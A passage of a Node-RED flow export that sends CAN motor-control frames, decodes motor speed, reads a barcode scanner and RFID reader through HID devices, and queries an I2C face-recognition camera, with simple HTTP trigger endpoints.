        "onceDelay": 0.1,
        "topic": "",
        "payload": "0x300007f#",
        "payloadType": "str",
        "x": 310,
        "y": 260,
        "wires": [
            [
                "4084535c93accaaf"
            ]
        ]
    },
    {
        "id": "75df1e7c3c2c5480",
        "type": "comment",
        "z": "b29f49fc630e741c",
        "name": "Send CAN frames in using different payloads on CAN0",
        "info": "",
        "x": 320,
        "y": 80,
        "wires": []
    },
    {
        "id": "f51221828c4e7961",
        "type": "comment",
        "z": "b29f49fc630e741c",
        "name": "Receiove CAN data from interface CAN0",
        "info": "",
        "x": 360,
        "y": 640,
        "wires": []
    },
    {
        "id": "d775a68e4ab39ae8",
        "type": "socketcan-out",
        "z": "b29f49fc630e741c",
        "name": "socketcan-out",
        "config": "e34ce9cff2013174",
        "x": 250,
        "y": 780,
        "wires": [
            [
                "4f13fa2ddb02f91c",
                "98f1025acb809a45"
            ]
        ]
    },
    {
        "id": "4084535c93accaaf",
        "type": "socketcan-in",
        "z": "b29f49fc630e741c",
        "name": "socketcan-in",
        "config": "e34ce9cff2013174",
        "x": 490,
        "y": 320,
        "wires": []
    },
    {
        "id": "23233e9ab169403c",
        "type": "inject",
        "z": "b29f49fc630e741c",
        "name": "stop",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payload": "400007f#00000000000000",
        "payloadType": "str",
        "x": 270,
        "y": 440,
        "wires": [
            [
                "4084535c93accaaf"
            ]
        ]
    },
    {
        "id": "bd519d309811ad4e",
        "type": "inject",
        "z": "b29f49fc630e741c",
        "name": "Send position",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payload": "1200007f#16700000C3F54840",
        "payloadType": "str",
        "x": 290,
        "y": 320,
        "wires": [
            [
                "4084535c93accaaf"
            ]
        ]
    },
    {
        "id": "fdb2a301789d7059",
        "type": "inject",
        "z": "b29f49fc630e741c",
        "name": "Speed mode initialisation",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payload": "1200007f#0570000002000000",
        "payloadType": "str",
        "x": 730,
        "y": 200,
        "wires": [
            [
                "ffcfca7b99570c5b"
            ]
        ]
    },
    {
        "id": "ffcfca7b99570c5b",
        "type": "socketcan-in",
        "z": "b29f49fc630e741c",
        "name": "socketcan-in",
        "config": "e34ce9cff2013174",
        "x": 900,
        "y": 300,
        "wires": []
    },
    {
        "id": "5cc644b64f0a4334",
        "type": "inject",
        "z": "b29f49fc630e741c",
        "name": "Speed mode start",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payload": "0x300007f#",
        "payloadType": "str",
        "x": 710,
        "y": 260,
        "wires": [
            [
                "ffcfca7b99570c5b"
            ]
        ]
    },
    {
        "id": "c03905aebac6d9c7",
        "type": "inject",
        "z": "b29f49fc630e741c",
        "name": "5RAD",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payload": "1200007f#0A7000000000A040",
        "payloadType": "str",
        "x": 670,
        "y": 320,
        "wires": [
            [
                "ffcfca7b99570c5b"
            ]
        ]
    },
    {
        "id": "29eda40f81c8be24",
        "type": "inject",
        "z": "b29f49fc630e741c",
        "name": "25rad",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payload": "1200007f#0A7000000000C841",
        "payloadType": "str",
        "x": 670,
        "y": 380,
        "wires": [
            [
                "ffcfca7b99570c5b"
            ]
        ]
    },
    {
        "id": "89389dab31e9e485",
        "type": "inject",
        "z": "b29f49fc630e741c",
        "name": "stop",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payload": "400007f#00000000000000",
        "payloadType": "str",
        "x": 670,
        "y": 440,
        "wires": [
            [
                "ffcfca7b99570c5b"
            ]
        ]
    },
    {
        "id": "aec3f2b49c69ed8e",
        "type": "inject",
        "z": "b29f49fc630e741c",
        "name": "speed test",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payload": "1100007f#0A7000000000",
        "payloadType": "str",
        "x": 280,
        "y": 520,
        "wires": [
            [
                "b0e3e09e91c65d8f"
            ]
        ]
    },
    {
        "id": "b0e3e09e91c65d8f",
        "type": "socketcan-in",
        "z": "b29f49fc630e741c",
        "name": "socketcan-in",
        "config": "e34ce9cff2013174",
        "x": 450,
        "y": 520,
        "wires": []
    },
    {
        "id": "4f13fa2ddb02f91c",
        "type": "function",
        "z": "b29f49fc630e741c",
        "name": "function 1",
        "func": "var data = msg.payload.data;  // Assuming your CAN node outputs data in msg.payload.data\n\n// Check if the data[0] is 10\nif (data.length === 8 && data[0] === 10) {\n   \n\n    var hexSpeedValue = (data[7] << 8) | data[6];\n\n    // Assuming we've previously calculated m (and possibly c if required)\n    var m = (20.0) / (0x41C8 - 0x40A0);\n\n    var speed = m * hexSpeedValue - m * 0x40A0 + 5.0;\n\n    msg.decodedSpeed = speed;\n\n    // Construct the output message\n    msg.payload = \"Received message with ID 0x\" + (msg.payload.canid || \"UNKNOWN\").toString(16) + \"\\n\";\n    msg.payload += \"speed:\" + speed + \" rad/s.\";\n}\n\nreturn msg;  // Return the modified msg object",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 460,
        "y": 680,
        "wires": [
            [
                "e1867263313aa968"
            ]
        ]
    },
    {
        "id": "e1867263313aa968",
        "type": "debug",
        "z": "b29f49fc630e741c",
        "name": "speed test",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "payload",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 630,
        "y": 680,
        "wires": []
    },
    {
        "id": "98f1025acb809a45",
        "type": "debug",
        "z": "b29f49fc630e741c",
        "name": "can input",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "payload",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 480,
        "y": 780,
        "wires": []
    },
    {
        "id": "576366b1f4f562e7",
        "type": "exec",
        "z": "b29f49fc630e741c",
        "command": "cat",
        "addpay": "",
        "append": "  /dev/hidraw2",
        "useSpawn": "true",
        "timer": "",
        "winHide": false,
        "oldrc": false,
        "name": "",
        "x": 1070,
        "y": 680,
        "wires": [
            [
                "b77b7693b5835533"
            ],
            [],
            []
        ]
    },
    {
        "id": "2aa890a621bb9e11",
        "type": "inject",
        "z": "b29f49fc630e741c",
        "name": "start",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payload": "",
        "payloadType": "date",
        "x": 930,
        "y": 680,
        "wires": [
            [
                "576366b1f4f562e7"
            ]
        ]
    },
    {
        "id": "7dd49e552aaa3647",
        "type": "debug",
        "z": "b29f49fc630e741c",
        "name": "Scanner Input",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "payload",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 1360,
        "y": 680,
        "wires": []
    },
    {
        "id": "696291f8eb0c483f",
        "type": "exec",
        "z": "b29f49fc630e741c",
        "command": "cat",
        "addpay": "",
        "append": "  /dev/hidraw0",
        "useSpawn": "true",
        "timer": "",
        "winHide": false,
        "oldrc": false,
        "name": "",
        "x": 1070,
        "y": 780,
        "wires": [
            [
                "c1fac5104c6c0dfb"
            ],
            [],
            []
        ]
    },
    {
        "id": "7b855f1555d662ee",
        "type": "inject",
        "z": "b29f49fc630e741c",
        "name": "start",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payload": "",
        "payloadType": "date",
        "x": 930,
        "y": 780,
        "wires": [
            [
                "696291f8eb0c483f"
            ]
        ]
    },
    {
        "id": "fd3681bd8a33ebbb",
        "type": "debug",
        "z": "b29f49fc630e741c",
        "name": "RFID input",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "payload",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 1350,
        "y": 780,
        "wires": []
    },
    {
        "id": "d9d9968dda54cbb7",
        "type": "comment",
        "z": "b29f49fc630e741c",
        "name": "Scanner Input",
        "info": "",
        "x": 950,
        "y": 640,
        "wires": []
    },
    {
        "id": "8dcdf0eafb6ae6da",
        "type": "comment",
        "z": "b29f49fc630e741c",
        "name": "RFID Input",
        "info": "",
        "x": 940,
        "y": 740,
        "wires": []
    },
    {
        "id": "c1fac5104c6c0dfb",
        "type": "function",
        "z": "b29f49fc630e741c",
        "name": "function 8",
        "func": "const N = 22;  // replace with the actual number\n\n// Retrieve the data arrays from the context or initialize if not present\nlet dataArray = context.get('dataArray') || [];\nlet count = context.get('count') || 0;\n\n// Add the array to the dataArray\ndataArray.push(msg.payload);\ncount++;\n\n// If count reaches the expected number of arrays, process them\nif (count == N) {\n    let combinedData = [].concat(...dataArray);\n    msg.payload = combinedData;\n\n    // Reset the dataArray and count for the next sequence\n    context.set('dataArray', []);\n    context.set('count', 0);\n    return msg; // Send the consolidated array\n} else {\n    context.set('dataArray', dataArray);\n    context.set('count', count);\n    return null; // Don't send anything until you receive all arrays\n}\n",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1200,
        "y": 780,
        "wires": [
            [
                "fd3681bd8a33ebbb"
            ]
        ]
    },
    {
        "id": "b77b7693b5835533",
        "type": "function",
        "z": "b29f49fc630e741c",
        "name": "function 9",
        "func": "const N = 22;  // replace with the actual number\n\n// Retrieve the data arrays from the context or initialize if not present\nlet dataArray = context.get('dataArray') || [];\nlet count = context.get('count') || 0;\n\n// Add the array to the dataArray\ndataArray.push(msg.payload);\ncount++;\n\n// If count reaches the expected number of arrays, process them\nif (count == N) {\n    let combinedData = [].concat(...dataArray);\n    msg.payload = combinedData;\n\n    // Reset the dataArray and count for the next sequence\n    context.set('dataArray', []);\n    context.set('count', 0);\n    return msg; // Send the consolidated array\n} else {\n    context.set('dataArray', dataArray);\n    context.set('count', count);\n    return null; // Don't send anything until you receive all arrays\n}\n",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1200,
        "y": 680,
        "wires": [
            [
                "7dd49e552aaa3647"
            ]
        ]
    },
    {
        "id": "c49859343aca3ffa",
        "type": "inject",
        "z": "b29f49fc630e741c",
        "name": "camera request",
        "props": [
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "x": 1020,
        "y": 240,
        "wires": [
            [
                "19efec08f7d13b69"
            ]
        ]
    },
    {
        "id": "21459143c38ea8cc",
        "type": "debug",
        "z": "b29f49fc630e741c",
        "name": "camera request",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "payload",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 1400,
        "y": 240,
        "wires": []
    },
    {
        "id": "b17b6bea183633dc",
        "type": "debug",
        "z": "b29f49fc630e741c",
        "d": true,
        "name": "debug 23",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "payload",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 1440,
        "y": 300,
        "wires": []
    },
    {
        "id": "21be18a538ab9cad",
        "type": "inject",
        "z": "b29f49fc630e741c",
        "name": "camera scan",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payload": "",
        "payloadType": "date",
        "x": 1090,
        "y": 420,
        "wires": [
            [
                "0a88c8119ceeed3d"
            ]
        ]
    },
    {
        "id": "d7877181f184430b",
        "type": "debug",
        "z": "b29f49fc630e741c",
        "name": "camera scan",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "payload",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 1410,
        "y": 420,
        "wires": []
    },
    {
        "id": "fefc492a95140b33",
        "type": "inject",
        "z": "b29f49fc630e741c",
        "name": "camera feedback",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payload": "",
        "payloadType": "date",
        "x": 960,
        "y": 340,
        "wires": [
            [
                "afe853cc530a2c0b"
            ]
        ]
    },
    {
        "id": "19efec08f7d13b69",
        "type": "function",
        "z": "b29f49fc630e741c",
        "name": "function 10",
        "func": "\nmsg.payload = Buffer.from([85, 170, 17, 0, 32, 48]);\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1130,
        "y": 180,
        "wires": [
            [
                "b5d18b8fe932a297"
            ]
        ]
    },
    {
        "id": "214ac6b5cb5e971b",
        "type": "function",
        "z": "b29f49fc630e741c",
        "name": "function 11",
        "func": "let arr = msg.payload;\nlet len = arr[3];\nlet info = {};\nvar data = arr.slice(5, 5 + len + 1);\ninfo['x'] = data[0];\ninfo['y'] = data[2];\ninfo['width'] = data[4];\ninfo['height'] = data[6];\ninfo['id'] = data[8];\nmsg.payload = info;\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1290,
        "y": 340,
        "wires": [
            [
                "93c049e65a9d2d40"
            ]
        ]
    },
    {
        "id": "93c049e65a9d2d40",
        "type": "debug",
        "z": "b29f49fc630e741c",
        "name": "camera feedback",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "payload",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 1470,
        "y": 340,
        "wires": []
    },
    {
        "id": "3f3029c25c6618f3",
        "type": "comment",
        "z": "b29f49fc630e741c",
        "name": "Camera Face Recognition",
        "info": "",
        "x": 930,
        "y": 60,
        "wires": []
    },
    {
        "id": "529722cd0bc52d87",
        "type": "http in",
        "z": "b29f49fc630e741c",
        "name": "",
        "url": "/pmi",
        "method": "get",
        "upload": false,
        "swaggerDoc": "",
        "x": 100,
        "y": 200,
        "wires": [
            []
        ]
    },
    {
        "id": "564bfc9a9d45b38c",
        "type": "http in",
        "z": "b29f49fc630e741c",
        "name": "",
        "url": "/pms",
        "method": "get",
        "upload": false,
        "swaggerDoc": "",
        "x": 100,
        "y": 260,
        "wires": [
            []
        ]
    },
    {
        "id": "97ba877eb9f72d38",
        "type": "http in",
        "z": "b29f49fc630e741c",
        "name": "",
        "url": "/sp1",
        "method": "get",
        "upload": false,
        "swaggerDoc": "",
        "x": 100,
        "y": 320,
        "wires": [
            []
        ]
    },
    {
        "id": "717752c7dd76d65a",
        "type": "http in",
        "z": "b29f49fc630e741c",
        "name": "",
        "url": "/sp2",
        "method": "get",
        "upload": false,
        "swaggerDoc": "",
        "x": 100,
        "y": 380,
        "wires": [
            []
        ]
    },
    {
        "id": "dfd824da8810bbb5",
        "type": "http in",
        "z": "b29f49fc630e741c",
        "name": "",
        "url": "/stop",
        "method": "get",
        "upload": false,
        "swaggerDoc": "",
        "x": 100,
        "y": 440,
        "wires": [
            []
        ]
    },
    {
        "id": "3b29298aafb2659c",
        "type": "http in",
        "z": "b29f49fc630e741c",
        "name": "",
        "url": "/smi",
        "method": "get",
        "upload": false,
        "swaggerDoc": "",
        "x": 520,
        "y": 200,
        "wires": [
            []
        ]
    },
    {
        "id": "2738b13433372075",
        "type": "http in",
        "z": "b29f49fc630e741c",
        "name": "",
        "url": "/sms",
        "method": "get",
        "upload": false,
        "swaggerDoc": "",
        "x": 520,
        "y": 260,
        "wires": [
            []
        ]
    },
    {
        "id": "95ece1d8a96d3fc6",
        "type": "http in",
        "z": "b29f49fc630e741c",
        "name": "",
        "url": "/ss1",
        "method": "get",
        "upload": false,
        "swaggerDoc": "",
        "x": 520,
        "y": 320,
        "wires": [
            []
        ]
    },
    {
        "id": "472de46ded3f9f1e",
        "type": "http in",
        "z": "b29f49fc630e741c",
        "name": "",
        "url": "/ss2",
        "method": "get",
        "upload": false,
        "swaggerDoc": "",
        "x": 520,
        "y": 380,
        "wires": [
            []
        ]
    },
    {
        "id": "d07cae5157510c58",
        "type": "http in",
        "z": "b29f49fc630e741c",
        "name": "",
        "url": "/stop",
        "method": "get",
        "upload": false,
        "swaggerDoc": "",
        "x": 520,
        "y": 440,
        "wires": [
            []
        ]
    },
    {
        "id": "7ed2e61ca0232509",
        "type": "function",
        "z": "b29f49fc630e741c",
        "name": "function 13",
        "func": "\nreturn msg;",
        "outputs": 1,
        "timeout": 0,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 310,
        "y": 160,
        "wires": [
            []
        ]
    },
    {
        "id": "0a88c8119ceeed3d",
        "type": "i2c scan",
        "z": "b29f49fc630e741c",
        "name": "",
        "busno": "1",
        "x": 1240,
        "y": 420,
        "wires": [
            [
                "d7877181f184430b"
            ],
            [
                "d7877181f184430b"
            ]
        ]
    },
    {
        "id": "afe853cc530a2c0b",
        "type": "i2c in",
        "z": "b29f49fc630e741c",
        "name": "",
        "busno": "1",
        "address": "50",
        "command": "32",
        "count": "16",
        "x": 1130,
        "y": 340,
        "wires": [
            [
                "b17b6bea183633dc",
                "214ac6b5cb5e971b"
            ]
        ]
    },
    {
        "id": "b5d18b8fe932a297",
        "type": "i2c out",
        "z": "b29f49fc630e741c",
        "name": "",
        "busno": "1",
        "address": "50",
        "command": "32",
        "payload": "payload",
        "payloadType": "msg",
        "count": "8",
        "x": 1230,
        "y": 240,
        "wires": [
            [
                "21459143c38ea8cc"
            ]
        ]
    },
    {
        "id": "761c45a17ca7a0e6",
        "type": "comment",
        "z": "4024900d334e5de4",
        "name": "Receiove CAN data from interface CAN0",
        "info": "",
        "x": 240,
        "y": 600,
        "wires": []
    },
    {
        "id": "62c3bb78f9c6a09e",
        "type": "socketcan-out",
        "z": "4024900d334e5de4",
        "name": "socketcan-out",
        "config": "e34ce9cff2013174",
        "x": 130,
        "y": 740,
        "wires": [
            [
                "869c17e0ce1b621c",
                "b74a14edcb9ee581"
            ]
        ]
    },
    {
        "id": "2a722581531d456c",
        "type": "socketcan-in",
        "z": "4024900d334e5de4",
        "name": "socketcan-in",
        "config": "e34ce9cff2013174",
        "x": 480,
        "y": 300,
        "wires": []
    },
    {
        "id": "684a1c998b641a05",
        "type": "socketcan-in",
        "z": "4024900d334e5de4",
        "name": "socketcan-in",
        "config": "e34ce9cff2013174",
        "x": 980,
        "y": 300,
        "wires": []
    },
    {
        "id": "4f3dcf1bb9d56b31",
        "type": "socketcan-in",
        "z": "4024900d334e5de4",
        "name": "socketcan-in",
        "config": "e34ce9cff2013174",
        "x": 480,
        "y": 480,
        "wires": []
    },
    {
        "id": "869c17e0ce1b621c",
        "type": "function",
        "z": "4024900d334e5de4",
        "name": "function 14",
        "func": "var data = msg.payload.data;  // Assuming your CAN node outputs data in msg.payload.data\n\n// Check if the data[0] is 10\nif (data.length === 8 && data[0] === 10) {\n   \n\n    var hexSpeedValue = (data[7] << 8) | data[6];\n\n    // Assuming we've previously calculated m (and possibly c if required)\n    var m = (20.0) / (0x41C8 - 0x40A0);\n\n    var speed = m * hexSpeedValue - m * 0x40A0 + 5.0;\n\n    msg.decodedSpeed = speed;\n\n    // Construct the output message\n    msg.payload = \"Received message with ID 0x\" + (msg.payload.canid || \"UNKNOWN\").toString(16) + \"\\n\";\n    msg.payload += \"speed:\" + speed + \" rad/s.\";\n}\n\nreturn msg;  // Return the modified msg object",
        "outputs": 1,
        "timeout": "",
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 350,
        "y": 700,
        "wires": [
            [
                "0a8ab0a0be7d4d64",
                "f2e506f7f8493769"
            ]
        ]
    },
    {
        "id": "0a8ab0a0be7d4d64",
        "type": "debug",
        "z": "4024900d334e5de4",
        "name": "speed test",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "payload",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 570,
        "y": 700,
        "wires": []
    },
    {
        "id": "b74a14edcb9ee581",
        "type": "debug",
        "z": "4024900d334e5de4",
        "name": "can input",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "payload",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 360,
        "y": 740,
        "wires": []
    },
    {
        "id": "7f6c5bd969b95419",
        "type": "exec",
        "z": "4024900d334e5de4",
        "command": "cat",
        "addpay": "",
        "append": "  /dev/hidraw2",
        "useSpawn": "true",
        "timer": "",
        "winHide": false,
        "oldrc": false,
        "name": "",
        "x": 1010,
        "y": 640,
        "wires": [
            [
                "f3a660e3ba3ea093"
            ],
            [],
            []
        ]
    },
    {
        "id": "2e1df48951e762d8",
        "type": "debug",
        "z": "4024900d334e5de4",
        "name": "Scanner Input",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "payload",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 1360,
        "y": 640,
        "wires": []
    },
    {
        "id": "25fdc8a3f678199d",
        "type": "exec",
        "z": "4024900d334e5de4",
        "command": "cat",
        "addpay": "",
        "append": "  /dev/hidraw0",
        "useSpawn": "true",
        "timer": "",
        "winHide": false,
        "oldrc": false,
        "name": "",
        "x": 1010,
        "y": 740,
        "wires": [
            [
                "8d41491109501665"
            ],
            [],
            []
        ]
    },
    {
        "id": "ba762df89161956b",
        "type": "debug",
        "z": "4024900d334e5de4",
        "name": "RFID input",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "payload",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 1350,
        "y": 740,
        "wires": []
    },
    {
        "id": "3427fdf7e2d55df7",
        "type": "comment",
        "z": "4024900d334e5de4",
        "name": "Scanner Input",
        "info": "",
        "x": 890,
        "y": 600,
        "wires": []
    },
    {
        "id": "f48d12b8c31005ee",
        "type": "comment",
        "z": "4024900d334e5de4",
        "name": "RFID Input",
        "info": "",
        "x": 880,
        "y": 700,
        "wires": []
    },
    {
        "id": "8d41491109501665",
        "type": "function",
        "z": "4024900d334e5de4",
        "name": "function 15",
        "func": "const N = 22;  // replace with the actual number\n\n// Retrieve the data arrays from the context or initialize if not present\nlet dataArray = context.get('dataArray') || [];\nlet count = context.get('count') || 0;\n\n// Add the array to the dataArray\ndataArray.push(msg.payload);\ncount++;\n\n// If count reaches the expected number of arrays, process them\nif (count == N) {\n    let combinedData = [].concat(...dataArray);\n    msg.payload = combinedData;\n\n    // Reset the dataArray and count for the next sequence\n    context.set('dataArray', []);\n    context.set('count', 0);\n    return msg; // Send the consolidated array\n} else {\n    context.set('dataArray', dataArray);\n    context.set('count', count);\n    return null; // Don't send anything until you receive all arrays\n}\n",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1170,
        "y": 740,
        "wires": [
            [
                "ba762df89161956b",
                "1431d96ad6034328"
            ]
        ]
    },
    {
        "id": "f3a660e3ba3ea093",
        "type": "function",
        "z": "4024900d334e5de4",
        "name": "function 16",
        "func": "const N = 22;  // replace with the actual number\n\n// Retrieve the data arrays from the context or initialize if not present\nlet dataArray = context.get('dataArray') || [];\nlet count = context.get('count') || 0;\n\n// Add the array to the dataArray\ndataArray.push(msg.payload);\ncount++;\n\n// If count reaches the expected number of arrays, process them\nif (count == N) {\n    let combinedData = [].concat(...dataArray);\n    msg.payload = combinedData;\n\n    // Reset the dataArray and count for the next sequence\n    context.set('dataArray', []);\n    context.set('count', 0);\n    return msg; // Send the consolidated array\n} else {\n    context.set('dataArray', dataArray);\n    context.set('count', count);\n    return null; // Don't send anything until you receive all arrays\n}\n",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1170,
        "y": 640,
        "wires": [
            [
                "2e1df48951e762d8",
                "61abeb0fac389710"
            ]
        ]
    },
    {
        "id": "ba115b786b4f6353",
        "type": "debug",
        "z": "4024900d334e5de4",
        "name": "camera request",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "payload",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 1620,
        "y": 220,
        "wires": []
    },
    {
        "id": "6947c724bc9ff29a",
        "type": "debug",
        "z": "4024900d334e5de4",
        "d": true,
        "name": "debug 25",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "payload",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 1600,
        "y": 260,
        "wires": []
    },
    {
        "id": "71e85b8d2230cc72",
        "type": "inject",
        "z": "4024900d334e5de4",
        "name": "camera scan",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payload": "",
        "payloadType": "date",
        "x": 1110,
        "y": 400,
        "wires": [
            [
                "766aeb3138b0f9af"
            ]
        ]
    },
    {
        "id": "ab40f77e5e6b097a",
        "type": "debug",
        "z": "4024900d334e5de4",
        "name": "camera scan",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "payload",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 1510,
        "y": 400,
        "wires": []
    },
    {
        "id": "d1895c8711b71d7a",
        "type": "function",
        "z": "4024900d334e5de4",
        "name": "camera request",
        "func": "\nmsg.payload = Buffer.from([85, 170, 17, 0, 32, 48]);\nreturn msg;",
        "outputs": 1,
        "timeout": "",
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1260,
        "y": 220,
        "wires": [
            [
                "c84822046af4459f"
            ]
        ]
    },
    {
        "id": "2e2b3e1fb4758133",
        "type": "function",
        "z": "4024900d334e5de4",
        "name": "camera feedback",
        "func": "let arr = msg.payload;\nlet len = arr[3];\nlet info = {};\nvar data = arr.slice(5, 5 + len + 1);\ninfo['x'] = data[0];\ninfo['y'] = data[2];\ninfo['width'] = data[4];\ninfo['height'] = data[6];\ninfo['id'] = data[8];\nmsg.payload = info;\nreturn msg;",
        "outputs": 1,
        "timeout": "",
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1490,
        "y": 320,
        "wires": [
            [
                "95281341ab40d68f",
                "c3b8426cd216f593"
            ]
        ]
    },
    {
        "id": "95281341ab40d68f",
        "type": "debug",
        "z": "4024900d334e5de4",
        "name": "camera feedback",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "payload",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 1690,
        "y": 320,
        "wires": []
    },
    {
        "id": "56c94147aaf9b187",
        "type": "http in",
        "z": "4024900d334e5de4",
        "name": "",
        "url": "/pmi",
        "method": "get",
        "upload": false,
        "swaggerDoc": "",
        "x": 100,
        "y": 160,
        "wires": [
            [
                "2716ce7564503111"
            ]
        ]
    },
    {
        "id": "92af40b6a40ff22e",
        "type": "http in",
        "z": "4024900d334e5de4",
        "name": "",
        "url": "/pms",
        "method": "get",
        "upload": false,
        "swaggerDoc": "",
        "x": 100,
        "y": 240,
        "wires": [
            [
                "8dd33276fce5e9c4"
            ]
        ]
    },
    {
        "id": "2e292a6d3313a2d8",
        "type": "http in",
        "z": "4024900d334e5de4",
        "name": "",
        "url": "/sp1",
        "method": "get",
        "upload": false,
        "swaggerDoc": "",
        "x": 100,
        "y": 300,
        "wires": [
            [
                "bd455abd4e6ce22b"
            ]
        ]
    },
    {
        "id": "2ccda193d1ce93e5",
        "type": "http in",
        "z": "4024900d334e5de4",
        "name": "",
        "url": "/sp2",
        "method": "get",
        "upload": false,
        "swaggerDoc": "",
        "x": 100,
        "y": 360,
        "wires": [
            [
                "5e68d21c8162f25e"
            ]
        ]
    },
    {
        "id": "3b1f39a907c7cd72",
        "type": "http in",
        "z": "4024900d334e5de4",
        "name": "",
        "url": "/stop",
        "method": "get",
        "upload": false,
        "swaggerDoc": "",
        "x": 100,
        "y": 420,
        "wires": [
            [
                "aca76b5d523870c3"
            ]
        ]
    },
    {
        "id": "344530df7919d0fa",
        "type": "http in",
        "z": "4024900d334e5de4",
        "name": "",
        "url": "/smi",
        "method": "get",
        "upload": false,
        "swaggerDoc": "",
        "x": 640,
        "y": 160,
        "wires": [
            [
                "4bbe35b95f40bde3"
            ]
        ]
    },
    {
